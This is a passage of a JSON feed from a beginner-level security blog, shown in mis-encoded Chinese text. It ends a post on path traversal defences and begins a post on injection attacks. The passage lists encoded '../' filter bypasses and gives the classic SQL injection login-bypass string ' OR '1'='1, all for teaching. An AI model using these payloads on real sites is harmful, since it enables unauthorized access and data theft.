id=\"%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A\"><a class=\"direct-link\" href=\"#%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A\">#</a> è®Šå½¢çš„è·¯å¾‘éæ­·æ”»æ“Š</h2>\n<p>åœ¨çœ‹å®Œä¸Šè¿°æ‰€èªªæ˜çš„æ”»æ“Šä¹‹å¾Œï¼Œä½ å¯èƒ½æƒ³èªªé‚£æˆ‘åªè¦æ“‹æ‰ä½¿ç”¨è€…åœ¨æˆ‘çš„ URL ä»¥åŠ HTTP è«‹æ±‚çš„è¼¸å…¥é€²è¡Œé©—è­‰åŠé™åˆ¶ï¼Œä¸å…è¨±../çš„å‡ºç¾ï¼Œé‚£éº¼é‡å°è·¯å¾‘éæ­·çš„æ”»æ“Šä¹Ÿå°±ç„¡ç”¨æ­¦ä¹‹åœ°äº†å§ï¼Ÿ</p>\n<p>ä¸€å€‹å¥½æ¶ˆæ¯å’Œä¸€å€‹å£æ¶ˆæ¯å‘Šè¨´ä½ ï¼Œå¥½æ¶ˆæ¯æ˜¯ä½ çš„è§€å¿µæ­£ç¢ºï¼Œå°URL ä»¥åŠ HTTP è«‹æ±‚çš„è¼¸å…¥é€²è¡Œé©—è­‰åŠé™åˆ¶çš„ç¢ºæ˜¯é¿å…è·¯å¾‘éæ­·æ”»æ“Šçš„æ‡‰å°ç­–ç•¥ä¹‹ä¸€ï¼Œä½†å£æ¶ˆæ¯æ˜¯../æ˜¯æœ‰è®Šå½¢çš„ï¼Œè€Œä¸”é‚„æœ‰å¾ˆå¤šç¨®è®Šå½¢ï¼Œå…¶ä¸­æœ€å¸¸è¦‹çš„è®Šå½¢å°±æ˜¯åœ¨<strong>é›¶åŸºç¤è³‡å®‰ç³»åˆ—(äºŒ)-èªè­˜ XSS(Cross-Site Scripting)</strong> ä¸­å’Œå¤§å®¶æéçš„HTML Encoder æœƒå°‡ <code>%2e%2e%2f</code> è§£æç‚ºÂ ../ ç¹éé‡å°Â ../ çš„æª¢æŸ¥ï¼Œé™¤æ­¤ä¹‹å¤–é‚„æœ‰ UTF-8 ç·¨ç¢¼ <code>%c1%1c</code> æœƒè¢«è§£æç‚º / ï¼Œä»¥åŠè‹¥æ˜¯æ›´é€²éšä¸€é»çš„è©±æ”»æ“Šè€…é‚„å¯èƒ½ä½¿ç”¨ xor æ¦‚å¿µï¼Œ<code>%d0^%ff = /</code> çš„ç·¨ç¢¼æ–¹å¼ï¼Œç¹éé™åˆ¶çš„å­—å…ƒï¼Œå¦‚æœå¤§å®¶å°æ”»æ“Šè€…å¯èƒ½ä½¿ç”¨çš„é€²éš injection æœ‰èˆˆè¶£ï¼Œæˆ‘ä¹‹å¾Œæœƒå†å¯«ä¸€ç¯‡æ–‡ç« å’Œå¤§å®¶èªªæ˜ï¼Œåœ¨é€™è£¡ä¸»è¦æƒ³å‘Šè¨´å¤§å®¶çš„æ˜¯é™åˆ¶å­—å…ƒçš„è¼¸å…¥æ˜¯å€‹å¥½çš„æ‡‰å°ç­–ç•¥ï¼Œä½†å‰ææ˜¯å°‡æ‰€æœ‰æ”»æ“Šè€…å¯èƒ½çš„æ”»æ“Šæ–¹å¼å…¨éƒ¨å¯«é€²è¦å‰‡ä¸­ï¼Œå¦å‰‡ä»ç„¶æœƒä½¿æ”»æ“Šè€…æœ‰æ©Ÿå¯è¶ã€‚</p>\n<h2 id=\"%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\">#</a> å¦‚ä½•é˜²ç¦¦</h2>\n<p>ä¸Šé¢èªªäº†é€™éº¼å¤šæ”»æ“Šè€…å¯èƒ½çš„æ”»æ“Šæ–¹å¼ï¼Œåˆè¡¨ç¤ºæœ‰é‚£éº¼å¤šè®Šå½¢çš„è·¯å¾‘éæ­·æ”»æ“Šï¼Œé‚£é›£é“æˆ‘å€‘å°æ”»æ“Šè€…å°±ç„¡è¨ˆå¯æ–½äº†å—ï¼Ÿ</p>\n<p>ç•¶ç„¶ä¸æ˜¯ï¼ä¾æ“šæˆ‘çš„ç¶“é©—ï¼Œé‡å°è·¯å¾‘éæ­·æ”»æ“Šçš„é˜²ç¦¦å¯ä»¥å¾ä¸‰å€‹æ–¹é¢ä¾†çœ‹</p>\n<p><strong>1.è¼¸å…¥é©—è­‰</strong></p>\n<p>é‡å°è·¯å¾‘éæ­·æ”»æ“Šæœ€ç›´è¦ºçš„é˜²ç¦¦å°±æ˜¯é©—è­‰åŠé™åˆ¶æ‰€æœ‰åœ¨ URL ä»¥åŠ HTTP è«‹æ±‚ï¼Œä¸å…è¨±è¼¸å…¥Â ../ ä»¥åŠå…¶ä»–è®Šå½¢çš„è¼¸å…¥ï¼Œé€™æ–¹é¢çš„é˜²ç¦¦å¼·åº¦æœƒåœ¨æ–¼ç¶²ç«™å°æ–¼è¼¸å…¥é©—è­‰çš„è¦å‰‡å®Œå–„åº¦è€Œæ±ºå®šã€‚</p>\n<p><strong>2.æ¬Šé™æ§ç®¡</strong></p>\n<p>åœ¨é–‹ç™¼å’Œéƒ¨ç½²ç¶²é æ‡‰ç”¨ç¨‹å¼çš„æ™‚å€™ç›¡å¯èƒ½çš„ä»¥æœ€å°çš„æ¬Šé™åŸ·è¡Œï¼Œç›¡å¯èƒ½çš„åˆªé™¤æ‰€æœ‰ä¸å¸¸ä½¿ç”¨æˆ–æ¬Šé™éå¤§çš„ä½¿ç”¨è€…ä¸¦å–æ¶ˆ Guest è§’è‰²ï¼Œå»ºç«‹å®Œæ•´çš„ ACLï¼ˆAccess Control Listï¼‰ ï¼Œä¸”ç¢ºä¿æ–‡ä»¶çš„å¯è®€å¯å¯«æ¬Šé™ä¹Ÿçš„ç¢ºå—åˆ°æ§ç®¡ï¼ˆä¾‹å¦‚Linux ç³»çµ±ç›¡å¯èƒ½ä¸è¦æœ‰æ¬Šé™ 777 çš„æ–‡ä»¶ï¼Œé€™æœƒè®“é€™ä»½æ–‡ä»¶å…¨ä¸–ç•Œå¯è®€å¯å¯«ï¼‰ï¼Œé€™æ¨£çš„è©±å³ä½¿æ”»æ“Šè€…æˆåŠŸçš„æŸ¥çœ‹ç¶²é ç›®éŒ„ï¼Œä¹Ÿæœƒå› ç‚ºæ¬Šé™å•é¡Œè€Œå°è‡´ç„¡æ³•å­˜å–æ–‡ä»¶ï¼Œæœ€å¤šåªèƒ½å¾—çŸ¥ç¶²ç«™ç›®éŒ„æ¶æ§‹åŠæª”åã€‚</p>\n<p><strong>3.è³‡æ–™è™•ç†</strong></p>\n<p>ä¹‹æ‰€ä»¥æŠŠè³‡æ–™è™•è£¡æ”¾åœ¨æœ€å¾Œä¸€æ­¥æ˜¯å› ç‚ºæˆ‘èªç‚ºè³‡æ–™è™•ç†æ˜¯é¢å°æ”»æ“Šè€…çš„æœ€å¾Œä¸€é“é˜²ç·šï¼Œå³ä½¿æ”»æ“Šè€…å¯ä»¥ç¹éè¼¸å…¥é©—è­‰ï¼ŒæˆåŠŸç²å¾—ç€è¦½ç›®éŒ„çš„æ¬Šé™ï¼Œä½†å¦‚æœç›®éŒ„ä¸­æ²’æœ‰éš±å¯†è³‡æ–™æˆ–æ˜¯å°‡é‡è¦è³‡æ–™å¦å¤–å‚™ä»½åœ¨å…¶ä»–çš„ä¼ºæœå™¨ï¼Œä¾‹å¦‚å¯†ç¢¼æª”ã€å·²ç¶“æ²’æœ‰è¢«å¼•ç”¨çš„èˆŠæ–‡ä»¶ã€ç¶²ç«™å‚™ä»½çš„è³‡æ–™ã€Log ç´€éŒ„ã€ç³»çµ±ç‰ˆæœ¬ç´€éŒ„ ç­‰ï¼Œæ”»æ“Šè€…åœ¨æ²’æœ‰ç²å¾—ä»»ä½•æœ‰æ•ˆè³‡æ–™çš„æƒ…æ³ä¸‹ä¹Ÿåªèƒ½ç¹¼çºŒå˜—è©¦å…¶ä»–çš„æ”»æ“Šè·¯å¾‘ã€‚</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h2>\n<p>é›–ç„¶è³‡æ–™è™•ç†æ˜¯ä¸‰ç¨®é˜²ç¦¦ä¸­é¢å°æ”»æ“Šè€…çš„æœ€å¾Œä¸€é“é˜²ç·šï¼Œä½†æˆ‘èªç‚ºæœ€é‡è¦çš„é˜²ç¦¦é‚„æ˜¯é‡å°è·¯å¾‘éæ­·æ”»æ“Šçš„è¼¸å…¥é©—è­‰ï¼ŒåŸå› æ˜¯å› ç‚ºå°æ”»æ“Šè€…ä¾†èªªï¼Œä¸€ä½†ç™¼ç¾ç¶²ç«™çš„è¼¸å…¥é©—è­‰è¦å‰‡è¨­ç½®å‘¨å…¨æˆ–æ˜¯ä¸€èˆ¬å¸¸è¦‹çš„æ‰‹æ³•éƒ½æ²’è¾¦æ³•ç²å¾—ä»»ä½•æœ‰æ•ˆçš„è³‡æ–™æ™‚ï¼Œæ”»æ“Šè€…é€šå¸¸æœƒé¸æ“‡å¦å°‹ç›®æ¨™ï¼Œæ‰€ä»¥æˆ‘å»ºè­°çš„æ–¹å¼æœƒæ˜¯å»ºç«‹ä¸€å€‹é‡å°è·¯å¾‘éæ­·æ”»æ“ŠåŒ…å«Â ../ åŠ HTML Encoder ç·¨ç¢¼è¦å‰‡çš„è¼¸å…¥é©—è­‰æœƒæ˜¯é‡å°è·¯å¾‘éæ­·æ”»æ“Šé¦–å…ˆè©²åšçš„äº‹ï¼Œæ¥è‘—æ‰æ˜¯åˆªé™¤æ‰€æœ‰ä¸å¸¸ä½¿ç”¨çš„ä½¿ç”¨è€…æ¬Šé™ä¸¦ä¸”ä¸å…è¨±é ç«¯æ“ä½œï¼Œå°‡ç•¶å‰ç¶²ç«™ç›®éŒ„ä¸­éå¿…è¦å­˜åœ¨çš„é‡è¦æª”æ¡ˆå¦å¤–å‚™ä»½ä¸¦åœ¨ç•¶ä¸‹çš„ç›®éŒ„ä¸­åˆªé™¤ï¼Œä»¥ä¸Šå…©ä»¶äº‹æƒ…å¯ä»¥ä¾æ“šå…¬å¸çš„æƒ…æ³åšèª¿æ•´ï¼Œä¾‹å¦‚å¸³è™Ÿæ¬Šé™è¤‡é›œå…ˆä¸å‹•æˆ–é‡è¦çš„æª”æ¡ˆä½ç½®æ··äº‚ä¸å¥½æ­¸ç´æ‰€ä»¥å…ˆè™•ç†æ¬Šé™ ç­‰ï¼Œä»¥å…¬å¸æ‰¿æ“”æˆæœ¬è¼ƒä½çš„æ–¹å¼è‡ªè¡Œå–æ¨ã€‚</p>\n<p>ç•¶ä»¥ä¸Šä¸‰ç¨®é˜²ç¦¦éƒ½é€²è¡Œä¹‹å¾Œï¼Œå³ä½¿æ”»æ“Šè€…é¡˜æ„èŠ±æ™‚é–“å˜—è©¦é™¤äº†ä¸€èˆ¬å¸¸è¦‹è¦å‰‡çš„è·¯å¾‘éæ­·æ”»æ“Šå¤–å†ç‰¹åˆ¥è¨­è¨ˆæ”»æ“Šï¼Œä¸¦ä¸”åœ¨é€²å…¥ç›®éŒ„å¾Œé€£ä¸€èˆ¬ä½¿ç”¨è€…æ¬Šé™éƒ½æ²’æœ‰çš„æƒ…æ³ä¸‹å˜—è©¦ææ¬Šï¼Œå†ææ¬ŠæˆåŠŸå¾Œï¼Œçœ‹è‘—æ²’æœ‰é«˜é‡è¦æ€§è³‡æ–™çš„ç›®éŒ„åŒå¸¸ä¹Ÿæœƒæ„Ÿåˆ°æŒ«æŠ˜ã€‚</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> å»¶ä¼¸é–±è®€</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰- èªè­˜ XSS(Cross-Site Scripting)</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</a></p>\n</blockquote>\n<h4 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆå››ï¼‰- èªè­˜æ³¨å…¥æ”»æ“Šï¼ˆ Injection Attackï¼‰</h4>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-injectionattack\">èªè­˜æ³¨å…¥æ”»æ“Šï¼ˆ Injection Attackï¼‰</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h2>\n<h3 id=\"owasp-path-traversal\"><a class=\"direct-link\" href=\"#owasp-path-traversal\">#</a> OWASP Path Traversal</h3>\n<blockquote>\n<p><a href=\"https://owasp.org/www-community/attacks/Path_Traversal\">https://owasp.org/www-community/attacks/Path_Traversal</a></p>\n</blockquote>\n<h3 id=\"wikipedia-path-traversal\"><a class=\"direct-link\" href=\"#wikipedia-path-traversal\">#</a> Wikipedia Path Traversal</h3>\n<blockquote>\n<p><a href=\"https://en.wikipedia.org/wiki/Directory_traversal_attack\">https://en.wikipedia.org/wiki/Directory_traversal_attack</a></p>\n</blockquote>\n",
      "date_published": "2021-05-30T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-injectionattack/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-injectionattack/",
      "title": "é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆå››ï¼‰-èªè­˜æ³¨å…¥æ”»æ“Šï¼ˆ Injection Attackï¼‰",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p>æƒ³åƒä»Šå¤©æœ‰å€‹è·¯äººçªç„¶å‡ºç¾åœ¨ä½ é¢å‰ï¼Œæ‹¿è‘—ä¸€ç®¡é‡ç­’ä¸ç”±åˆ†èªªçš„å°±è¦å¾€ä½ èº«ä¸Šæˆ³ï¼Œç›¸ä¿¡æ­£å¸¸äººçš„ç¬¬ä¸€åæ‡‰è¦å˜›æ‹”è…¿å°±è·‘è¦å˜›é˜»æ­¢ä»–ï¼Œä½†å¦‚æœä»Šå¤©ä½ æ²’æƒ³åˆ°æœƒæœ‰é€™ç¨®ç‹€æ³ï¼Œä¸å°å¿ƒè®“ä»–æ³¨å…¥æˆåŠŸæœƒç™¼ç”Ÿç”šéº¼äº‹ï¼Ÿé›–ç„¶æœ‰å¾ˆå¤šç¨®å¯èƒ½ï¼Œä½†ç›¸ä¿¡æˆ‘ï¼Œé‚£ä¸€å®šä¸æœƒæ˜¯ç”šéº¼å¥½äº‹ã€‚</p>\n</blockquote>\n<p>ä»Šå¤©æƒ³å’Œå¤§å®¶èŠèŠå¸¸å‡ºç¾åœ¨ç¶²é å®‰å…¨é¢¨éšªæ¦œå–®ä¸Šçš„å¸¸å®¢ï¼Œ<strong>æ³¨å…¥æ”»æ“Šï¼ˆ Injection Attackï¼‰</strong>ï¼ŒèŠèŠé€™ç¨®é¢¨éšªåˆ°åº•æ˜¯å¦‚ä½•çš„å±éšªï¼Œå±…ç„¶å¯ä»¥é•·å¹´é«˜å±…é¢¨éšªæ¦œå–®çš„å‰ä¸‰ç”²ï¼Œå¦‚æœæˆ‘å€‘çš„ç¶²ç«™çœŸçš„ä¸å¹¸è¢«æ³¨å…¥æˆåŠŸäº†ï¼Œæœƒå°è‡´ç”šéº¼æ¨£çš„å¾Œæœï¼Ÿå¦‚æœçœŸçš„é€™éº¼å¯æ€•çš„è©±ï¼Œæˆ‘å€‘æœ‰æ²’æœ‰ç”šéº¼è¾¦æ³•å¯ä»¥é˜»æ­¢é€™ç¨®æ”»æ“Šå‘¢ï¼Ÿåœ¨çœ‹å®Œä»Šå¤©çš„æ–‡ç« ä¹‹å¾Œï¼Œå…¶å¯¦ä½ æœƒç™¼ç¾ï¼ŒåŸä¾†é€™äº›æ”»æ“Šé›¢æˆ‘å€‘é€™éº¼è¿‘ã€‚</p>\n<!-- summary -->\n<p><img src=\"/img/posts/jo/zerobased-injectionattack/p1.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8827\">https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8827</a></strong></p>\n<p>æ³¨å…¥æ”»æ“Šä¸¦ä¸åƒ…åƒ…æ˜¯æŒ‡å¤§å®¶è€³ç†Ÿèƒ½è©³ï¼Œé‡å°è³‡æ–™åº«ç›¸é—œç¶²é æ‡‰ç”¨ç¨‹å¼/æœå‹™æ”»æ“Šçš„ SQL Injectionï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬äº†æ¤å…¥æƒ¡æ„ shell æŒ‡ä»¤åˆ°ç¶²ç«™ä¸»æ©Ÿä½œæ¥­ç³»çµ±çš„ Command Injection ï¼Œç”šè‡³ä¹‹å‰æ›¾ä»‹ç´¹éçš„ XSS æ”»æ“Šä¹Ÿæ˜¯å±¬æ–¼æ³¨å…¥æ”»æ“Šçš„ä¸€ç¨®ã€‚</p>\n<p>ä¹Ÿå› æ­¤ï¼Œæˆ‘æƒ³è—‰ç”±é€™å€‹æ©Ÿæœƒè·Ÿå¤§å®¶ä»‹ç´¹åœ¨ Injection ä¸­æ¯”è¼ƒå®¹æ˜“è¢«æ”»æ“Šè€…ç™¼ç¾ä¸¦åˆ©ç”¨çš„å…©ç¨® Injection ï¼š SQL Injection ï¼† Command Injection</p>\n<p>ï¼ˆå¦‚æœå° <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">XSS æ”»æ“Š</a> æœ‰èˆˆè¶£çš„å°å¤¥ä¼´å¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„ XSS ä»‹ç´¹æ–‡ç« å–”ï¼‰</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E7%AD%96%E7%95%A5\">#</a> å¸¸è¦‹çš„æ”»æ“Šç­–ç•¥</h3>\n<p>å…ˆèªªå¸¸è¦‹çš„æ”»æ“Šç­–ç•¥ï¼Œé€™æ‡‰è©²æ˜¯æ‰€æœ‰ Injection éƒ½é€šç”¨çš„ï¼Œè€Œé‡å° Injection æ”»æ“Šç­–ç•¥å¤§è‡´åˆ†ç‚ºå…©ç¨® ï¼Œä¸€ç¨®æ˜¯æ‰€è¬‚çš„ç›²æ³¨æ”»æ“Šï¼ˆ Blindfolded Injectionï¼‰ï¼Œç›¸ç•¶æ–¼æ”»æ“Šè€…ç›´æ¥åœ¨å¤§è¡—ä¸Šæ‹¿è‘—é‡ç­’å°ä½ é€²è¡Œè¡é‹’ï¼Œå„ªé»æ˜¯ä¸éœ€è¦å¤ªå¤šçš„æº–å‚™å’Œæˆæœ¬ï¼Œåªè¦ç„¡è…¦å°ç¶²ç«™å¡å…¥å¸¸è¦‹çš„æ³¨å…¥ç¯„æœ¬å°±å¯ä»¥ï¼Œä¸éä¹Ÿå› ç‚ºå¦‚æ­¤ï¼Œæ‰€ä»¥æˆåŠŸæ©Ÿç‡åä½ï¼Œç•¢ç«Ÿå¤§è¡—ä¸Šæ‹¿è‘—é‡ç­’è¡é‹’è¢«é˜»æ­¢çš„æ©Ÿç‡å¯¦åœ¨æ˜¯æœ‰å¤ é«˜çš„å•¦ã€‚</p>\n<p>ç¬¬äºŒç¨®çš„è©±ï¼Œæ”»æ“Šè€…æœƒè—‰ç”±ç¶²ç«™çš„éŒ¯èª¤è¨Šæ¯åŠæ„å¤–æ´©æ¼çš„ç³»çµ±è³‡è¨Šï¼Œå°ç¶²ç«™é€²è¡Œé‡å°å¼çš„æ³¨å…¥ï¼Œè€Œé€™ç¨®æ”»æ“Šç­–ç•¥å…¶å¯¦é€šä¿—é»çš„èªªæ³•å°±æ˜¯é è¬€æ®ºäººï¼Œè—‰ç”±èª¿æŸ¥å—å®³è€…çš„å…¬å¸å’Œä½å®¶ä»¥åŠä¸Šä¸‹ç­è·¯ç·šï¼Œæ¥è‘—åŸ‹ä¼æ‹¿è‘—é‡ç­’å°å—å®³è€…é€²è¡Œæ³¨å°„ï¼Œè½èµ·ä¾†æˆåŠŸç‡å°±æ¯”ç¬¬ä¸€ç¨®é«˜å¤šäº†ï¼Œå°å§ï¼Ÿä¸éä¹Ÿå› ç‚ºé€™æ¨£ï¼Œæ‰€ä»¥æ”»æ“Šè€…å¿…é ˆè¦è€—è²»æˆæœ¬å°ç¶²ç«™é€²è¡Œè³‡æ–™æ”¶é›†ï¼Œå†æŠŠè³‡æ–™é€²è¡Œåˆ†æä¹‹å¾Œè¨­è¨ˆé‡å°å¼çš„æ³¨å…¥æ¨£æœ¬ï¼Œæ”»æ“Šè€…æ‰èƒ½é€²è¡Œæ”»æ“Šï¼Œéå¸¸çš„è€—è²»æ™‚é–“ã€‚</p>\n<p>ä¸éæ ¹æ“šæˆ‘è‡ªèº«çš„ç¶“é©—ï¼Œå…¶å¯¦ç›®å‰çš„æ”»æ“Šè€…é€šå¸¸æ˜¯æ¡å–ç¶œåˆå¼çš„æ”»æ“Šç­–ç•¥ï¼Œå…ˆç”¨ Open Source çš„å¼±é»æƒæå·¥å…·å°è¨±å¤šç›®æ¨™ç¶²ç«™é€²è¡Œæƒæï¼Œæ¥è‘—é‡å°é˜²ç¦¦æœ€ä¸å®Œæ•´çš„å¹¾å€‹ç¶²ç«™é€²è¡Œç›²æ³¨æ”»æ“Šï¼Œå†ä¾æ“šçµæœæŒ‘é¸æˆåŠŸå¯èƒ½æ€§æœ€é«˜çš„ç›®æ¨™ç¶²ç«™é€²è¡Œé‡å°æ€§çš„æ”»æ“Šè¨­è¨ˆï¼Œå°±åƒæ˜¯æ‹¿è‘—é‡ç­’å°è·¯ä¸Šçš„æ¯å€‹äººé€²è¡Œè¡é‹’ï¼Œçœ‹èµ·ä¾†åæ‡‰æœ€æ…¢æˆ–æ˜¯æœ€æ²’åæ‡‰çš„é‚£å¹¾å€‹äººï¼Œå°±æœƒæˆç‚ºæ”»æ“Šè€…çš„ç›®æ¨™ã€‚</p>\n<p>è€Œæ”»æ“Šè€…åˆ©ç”¨æ³¨å…¥æ”»æ“Šçš„ç›®çš„å¯ä»¥å¤§è‡´åˆ†é¡ç‚ºä¸‰ç¨®ï¼Œææ¬Šã€ç²å–æ•æ„Ÿè³‡æ–™ã€ç«„æ”¹è³‡æ–™ï¼Œæ¥ä¸‹ä¾†æˆ‘æœƒåœ¨ä»‹ç´¹æ”»æ“Šçš„åŒæ™‚å‘å¤§å®¶èªªæ˜ç•¶æ”»æ“Šè€…é”æˆä»¥ä¸Šä¸‰ç¨®ä»»ä¸€ç›®çš„æ™‚å¯èƒ½æœƒç”¢ç”Ÿçš„å®‰å…¨é¢¨éšªã€‚</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E4%BB%8B%E7%B4%B9\">#</a> å¸¸è¦‹çš„æ”»æ“Šä»‹ç´¹</h3>\n<h4 id=\"sql-injection\"><a class=\"direct-link\" href=\"#sql-injection\">#</a> SQL Injection</h4>\n<p>SQL Injection æ‡‰è©²æ˜¯å±¬æ–¼ Injection ç•Œä¸­ç„¡äººä¸çŸ¥ç„¡äººä¸æ›‰çš„åäººäº†ï¼Œä»¥ä¸€å€‹æœ€å¸¸è¦‹çš„ SQL Injection ç¯„æœ¬ä¾†èˆ‰ä¾‹èªªæ˜ï¼Œç•¶ä¸€å€‹ç¶²ç«™æœ‰å¸³è™Ÿå¯†ç¢¼å¿…é ˆè¼¸å…¥æ™‚ï¼Œæ”»æ“Šè€…åœ¨å¸³è™Ÿï¼å¯†ç¢¼çš„æ¬„ä½è¼¸å…¥ adminï¼ admin æ¥è‘—ç³»çµ±æç¤ºï¼Œå¯†ç¢¼éŒ¯èª¤ï¼Œæ–¼æ˜¯æ”»æ“Šè€…å¯ä»¥å¾—çŸ¥ï¼Œæœ‰ admin é€™å€‹å¸³è™Ÿï¼Œä½†æ˜¯å¯†ç¢¼éŒ¯èª¤ï¼Œæ–¼æ˜¯æ”»æ“Šè€…ä¾¿åœ¨å¯†ç¢¼çš„æ¬„ä½å˜—è©¦è¼¸å…¥ <code>â€passwordâ€™ OR â€˜1â€™=â€™1&quot;</code> ï¼Œå¦‚æœé€™å€‹ç¶²ç«™çš„è³‡æ–™åº«èªæ³•æ˜¯ <code>UserList.Password = â€˜Passwordâ€™</code> è€Œä¸”æ²’æœ‰é™åˆ¶è¼¸å…¥çš„è©±ï¼Œæ•´ä¸²é©—è­‰æœƒè®Šæˆ <code>UserList.Password = â€˜passwordâ€™ OR â€˜1â€™=â€™1'</code> ï¼Œä¹Ÿå°±æ˜¯èªª â€Passwordâ€è¢«ç•¶æˆäº†æŸå€‹ç©ºç™½æˆ–è€…ä¸é‡è¦çš„å­—ä¸²ï¼Œè€Œ1 = 1 æ˜¯ True é‚è¼¯åˆæ˜¯æˆç«‹çš„ï¼Œæ–¼æ˜¯ç•¶å¸³è™Ÿå’Œå¯†ç¢¼éƒ½æ˜¯ True çš„æ™‚å€™ï¼Œæœƒç™¼ç”Ÿç”šéº¼äº‹å‘¢ï¼Ÿæ²’éŒ¯ï¼æ”»æ“Šè€…å°±å¯ä»¥ä»¥ admin çš„æ¬Šé™ç™»å…¥ç¶²ç«™ç‚ºæ‰€æ¬²ç‚ºï¼</p>\n<p>å¦‚æœä»¥æ›´ç”Ÿæ´»åŒ–çš„ä¾‹å­ä¾†èªªæ˜ï¼Œ SQL Injection çš„åŸç†å…¶å¯¦å°±åƒæ˜¯ PTT çš„ç°½åæª”è£¡å¸¸çœ‹åˆ°çš„æ‰­æ›²æ„ç¾©æ¨æ–‡ä¸€æ¨£ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š</p>\n<p><img src=\"/img/posts/jo/zerobased-injectionattack/p2.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.ptt.cc/bbs/joke/M.1418702977.A.BEF.html\">https://www.ptt.cc/bbs/joke/M.1418702977.A.BEF.html</a></strong></p>\n<p>åŒæ¨£çš„ï¼Œæ”»æ“Šè€…ä¹Ÿæ˜¯è®Šæ›´äº†è³‡æ–™åº«ä¸­èªæ³•çš„æ„ç¾©ï¼Œè®“è³‡æ–™åº«è¼¸å‡ºäº†æ”»æ“Šè€…æƒ³çœ‹åˆ°çš„çµæœï¼Œé€²è€Œé”æˆç›®çš„ï¼Œé™¤äº†å¯èƒ½é€ æˆå‰›å‰›èªªæ˜çš„ææ¬Šï¼Œå°è‡´æ”»æ“Šè€…ç²å¾— admin æ¬Šé™ä»¥å¤–ï¼Œ SQL Injection ä¹Ÿå¯èƒ½é€ æˆè³‡æ–™åº«è³‡æ–™è¡¨ä¸­çš„è³‡æ–™å¤–æ´©ï¼Œä¾‹å¦‚ä¼æ¥­åŠå€‹äººæ©Ÿå¯†è³‡æ–™ã€å¸³æˆ¶è³‡æ–™ã€å¯†ç¢¼ç­‰ï¼Œç”šè‡³ä½¿æ”»æ“Šè€…ç«„æ”¹ç¶²ç«™ï¼Œåœ¨ç¶²ç«™åŠ å…¥æƒ¡æ„é€£çµã€æƒ¡æ„ç¨‹å¼ä½¿ä¼æ¥­å•†è­½é­åˆ°ç ´å£ã€‚</p>\n<h4 id=\"command-injection\"><a class=\"direct-link\" href=\"#command-injection\">#</a> Command Injection</h4>\n<p>é›–ç„¶ Command Injection ç›¸è¼ƒæ–¼ SQL Injection ä¸¦æ²’æœ‰é‚£éº¼æœ‰åæ°£ï¼Œä½†ä»–é€ æˆçš„é¢¨éšªå»å®Œå…¨ä¸é‘å¤šè®“ï¼Œ Command Injection 